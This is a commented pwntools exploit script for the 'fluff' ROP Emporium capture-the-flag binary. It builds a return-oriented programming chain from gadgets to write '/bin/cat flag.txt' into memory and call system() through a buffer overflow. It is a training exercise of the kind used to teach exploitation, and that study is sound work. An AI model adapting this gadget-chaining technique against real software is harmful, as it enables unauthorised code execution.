#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(0x{exe.symbols.pwnme:x}+79)
continue
'''.format(**locals())

io = start()

# This program has a buffer overflow. The pwnme() function
# calls fgets(buf, 50, stdin), although the buffer is only
# 32 bytes large ...

# We need to user ropper to find instructions to write arbitrary
# bytes to arbitrary memory address
#
#    $ ropper -f fluff --type=rop --search='mov'
#
# and we find this gadget:
#
#   mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
#
# where the first instruction is what we need. Note that we can
# pop 0x00 in r12 to make sure the subsequent xor has no effect.
#
# The plan is to write a ROP chain that does the following:
#   - Write "/bin/cat flag.txt" to a fixed address
#   - Load the fixed address into rdi 
#   - Return to system@plt
#
# We need to find a place to store the string to be crafted,
# and we want it to have a fixed address (assuming PIE is disabled).
# We could look for writable sections using rabin2:
#
#    $ rabin2 -S fluff
#
# But the problem is that sections may be overlapped, so it's not
# easy to understand whether a certain range of addresses is actually
# writable. A better approach is to look at vmmap (gdb command),
# which also shows address ranges and permissions.
# Or even look at the program headers of the ELF (readelf -Wl).

# Wait for the prompt.
msg = io.recvuntil("> ")
print(msg)
# Build the input vector as 40 arbitrary bytes plus the ROP chain,
# that will overwrithe the saved RIP.
vector = "B" * 40

def load_r11(chain, value):
    # Load r11 with something known
    #     mov r11d, 0x602050; ret;
    chain += p64(0x400845)

    # Load value in r12, XORed with the constant in r11
    #     pop r12; mov r13d, 0x604060; ret;
    chain += p64(0x400832)
    chain += p64(value ^ 0x602050)

    # XOR r11 and r12, so that we get rid of the constant
    #     xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    chain += p64(0x40082f)
    chain += p64(0xdeadbeef)

    return chain

def load_r10(chain, value):
    chain = load_r11(chain, value)

    # Exchange r11 with r10, so that the value in r11 ends up into r10
    #     xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
    chain += p64(0x400840)
    chain += p64(0xdeadbeef)  # arbitrary value, goes into r15

    return chain

def append_write(chain, addr, value):
    chain = load_r10(chain, addr)
    chain = load_r11(chain, value)

    # Write the content of r11 into the address in r10
    #     mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
    chain += p64(0x40084e)
    chain += p64(0xdeadbeef)
    chain += p64(0x00000000)  # important so that the xor has no effect

    return chain

def write_string(chain, addr, s):
    s += '\x00' * (8 - (len(s) % 8))
    i = 0
    while i < len(s):
        chain = append_write(chain, addr + i, u64(s[i:i+8]))
        i += 8

    return chain

# We will write somewhere in the middle of the range [0x601000,0x602000),
# which is writable, as shown by vmmap. Writing to the beginning of
# this range also works if we only write 8 bytes (writing more than
# that will crash the program before we can get to execute the
# desired command... remember that we are corrupting memory, so who
# knows why we get a crash).
dest_addr = 0x601f00

vector = write_string(vector, dest_addr, '/bin/cat flag.txt')

# Append the address of a 'pop rdi; ret' gadget,
# and the value of rdi (address of the crafted string).
vector += p64(0x4008c3)
vector += p64(dest_addr)

# Return to system@plt (rabin2 -i ./fluff)
vector += p64(exe.symbols["plt.system"])

io.sendline(vector)
io.interactive()
